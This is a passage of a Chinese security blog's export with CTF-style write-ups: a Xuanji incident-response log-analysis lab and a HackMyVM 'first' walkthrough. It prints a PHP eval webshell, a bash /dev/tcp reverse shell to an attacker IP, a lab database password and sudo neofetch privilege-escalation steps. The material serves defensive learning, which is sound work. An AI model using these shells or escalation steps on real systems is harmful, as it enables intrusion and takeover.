<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/var/www/html/wap/top.php</span><br><span class="line">md5:eeff2eabfd9b7a6d26fc1a53d3f7d1de</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--日志分析</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h3><h4 id="有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr </span><br></pre></td></tr></table></figure>

<p>学一把这些语句</p>
<p><strong>grep</strong>把有”Failed password for root”的行挑出来，**-a**是将文件作为文本文件处理，避免某些情况下文件被识别为二进制文件</p>
<p><strong>awk</strong>把挑出来的行里第11个字段挑出来（按空格分），这里挑出那些ip地址</p>
<p><strong>sort</strong>把ip地址排序，**-n<strong>按数字排序，</strong>-r**降序排序</p>
<p><strong>uniq</strong>去重,<strong>-c</strong>输出中显示每个行重复出现的次数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log<span class="comment"># cat auth.log* | grep -a &quot;Accept&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span></span><br><span class="line">      2 192.168.200.2</span><br><span class="line">      1 202.78.166.217</span><br></pre></td></tr></table></figure>

<p>思路和上一道差不多，grep过滤的字段改成”Accept”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125; # 要删掉自己的ip</span><br></pre></td></tr></table></figure>

<h4 id="爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="爆破用户名字典是什么？如果有多个使用”,”分割"></a>爆破用户名字典是什么？如果有多个使用”,”分割</h4><p>上题解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure>

<p>对于这个perl比较陌生</p>
<p><strong>Perl</strong> 命令，用于从匹配的日志行中提取用户名。</p>
<p><code>while($_=&lt;&gt;)</code>逐行读取输入（即日志文件的内容）。</p>
<p><code> /for(.*?) from/</code>使用正则表达式匹配 for 和from 之间的内容（即用户名）。</p>
<p> <code>print &quot;$1\n&quot;;</code>打印匹配到的用户名（捕获组 <strong>$1</strong>）</p>
<p>思路就是用grep过滤后用perl -e处理每行语句，把for和from之间的字段（通常是用户名）挑出来**，再进行后续操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h4><p>第一题的命令已经过滤出来了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="黑客登陆主机后新建了一个后门用户，用户名是多少"></a>黑客登陆主机后新建了一个后门用户，用户名是多少</h4><p>可以直接看&#x2F;etc&#x2F;passwd，多了个test2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">test2:x:1000:1000::/home/test2:/bin/sh</span><br><span class="line">debian:x:1001:1001:Debian:/home/debian:/bin/bash</span><br></pre></td></tr></table></figure>

<p>也可以</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log* | grep -a &quot;useradd&quot; | grep -a &quot;linux-rz&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h3><h4 id="提交当天访问次数最多的IP，即黑客IP："><a href="#提交当天访问次数最多的IP，即黑客IP：" class="headerlink" title="提交当天访问次数最多的IP，即黑客IP："></a>提交当天访问次数最多的IP，即黑客IP：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      1 192.168.200.211</span><br></pre></td></tr></table></figure>

<p>这次grep过滤的是”03&#x2F;Aug&#x2F;2023:08:”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的浏览器指纹是什么，提交指纹的md5："><a href="#黑客使用的浏览器指纹是什么，提交指纹的md5：" class="headerlink" title="黑客使用的浏览器指纹是什么，提交指纹的md5："></a>黑客使用的浏览器指纹是什么，提交指纹的md5：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;192.168.200.2&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print $6&#125;&#x27; | uniq -c</span><br><span class="line">     12 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">      1 curl/7.74.0</span><br><span class="line">   6543 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>直接grep上一题提取出来的ip</p>
<p>**awk -F’”‘ ‘{print $6}’**这里awk -F指定双引号为分割符，取第六个字段</p>
<blockquote>
<p>对于 Apache 访问日志，双引号内的字段通常是请求方法、URL、协议和 User-Agent 字符串。第六个字段通常是 User-Agent。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">md5:2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure>

<h4 id="查看index-php页面被访问的次数，提交次数："><a href="#查看index-php页面被访问的次数，提交次数：" class="headerlink" title="查看index.php页面被访问的次数，提交次数："></a>查看index.php页面被访问的次数，提交次数：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;/index.php&quot; | wc -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>

<p><strong>wc -l</strong>用于统计行数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看黑客IP访问了多少次，提交次数："><a href="#查看黑客IP访问了多少次，提交次数：" class="headerlink" title="查看黑客IP访问了多少次，提交次数："></a>查看黑客IP访问了多少次，提交次数：</h4><p>和上一题差不多</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &#x27;192.168.200.2 -&#x27; | wc -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:"></a>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;03/Aug/2023:08&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort -nr | uniq -c</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.211</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mysql日志分析"><a href="#mysql日志分析" class="headerlink" title="mysql日志分析"></a>mysql日志分析</h3><h4 id="黑客第一次写入的shell-flag-关键字符串"><a href="#黑客第一次写入的shell-flag-关键字符串" class="headerlink" title="黑客第一次写入的shell flag{关键字符串}"></a>黑客第一次写入的shell flag{关键字符串}</h4><p>找到sh.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/www/html# cat sh.php</span><br><span class="line">1	2	&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;	4</span><br><span class="line">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客反弹shell的ip-flag-ip"><a href="#黑客反弹shell的ip-flag-ip" class="headerlink" title="黑客反弹shell的ip flag{ip}"></a>黑客反弹shell的ip flag{ip}</h4><p>在日志中发现adminer.php中存在sqk注入，用sys_eval实现命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601005724.png" ></p>
<p>主要在&#x2F;tmp&#x2F;1.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/log/apache2# cat /tmp/1.sh</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx"><a href="#黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx" class="headerlink" title="黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx"></a>黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</h4><p>先猜测是udf提权，在common.php找到数据库连接的账号密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010114.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br><span class="line">连接到数据库</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">看一下plugin设置的目录</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010309.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010328.png" ></p>
<p>有两个udf.so</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/usr/lib/mysql/plugin/udf.so</span><br><span class="line">md5:b1818bde4e310f3d23f1005185b973e7</span><br></pre></td></tr></table></figure>

<h4 id="黑客获取的权限-flag-whoami后的值"><a href="#黑客获取的权限-flag-whoami后的值" class="headerlink" title="黑客获取的权限 flag{whoami后的值}"></a>黑客获取的权限 flag{whoami后的值}</h4><p>udf提权后拿到的是mysql权限，所以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm first 复盘</title>
    <url>/2024/03/15/new/index/</url>
    <content><![CDATA[<h4 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机ip 192.168.64.75</span><br><span class="line">攻击机ip 192.168.64.3</span><br></pre></td></tr></table></figure>

<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫描到3个端口，21端口，22端口和80端口</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >

<p>80端口看不到什么内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
<p>nmap扫出来ftp端口有几个文件夹，登陆看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>

<p>登陆账号密码都是ftp就行，看来看去只有first文件夹下面有个图片。下载出来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
<p>接着就使用<strong>stegseek</strong>工具分析一下，自动分析出一个secret.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>

<p>secret.txt里面是串base64字符，解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>

<p>注意看中间有一串十六机制数字，再解密一下，得到一个目录，访问一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
<h4 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h4><p>注意到第二点提到有upload.php，扫一下目录试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
<p>扫到一个uploads目录和一个upload.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
<p>可以发现文件上传没有任何过滤，那直接上传一个一句话木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
<p>蚁剑连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
<p>接下来我在目录上传一个后门php，kali开启监听，在蚁剑虚拟终端中用php，即可拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到有neofetch可以利用，<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/在这个网站查询到提权方式<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>

<p>成功拿到first到shell</p>
<p>再次sudo -l，发现有个secret，file查看发现是个二进制文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
<p>下载到本地用ida分析一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
<p>学习别的wp指导这里有个栈溢出（这块地方有待学习），输入超过10个字符串就会执行我们的command，<strong>思路就是sudo调用，然后给一个&#x2F;bin&#x2F;bash</strong>就拿到root到权限了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>图片隐写分析，提权命令利用，栈溢出的利用。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>blog</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-Heal笔记</title>
    <url>/2024/12/20/htb-Heal%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="295bfc1a15dcab86d65e99f7e6ae9d23e579558b6480a9a0ea72d457c162f9e1"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>htb</tag>
        <tag>笔记</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-UnderPass笔记</title>
    <url>/2024/12/25/htb-UnderPass%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="648bb5c6d3f21a2bd6a397ed9c952667509c602a5d2fd1ede385fe55232934ee"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>htb</tag>
        <tag>笔记</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
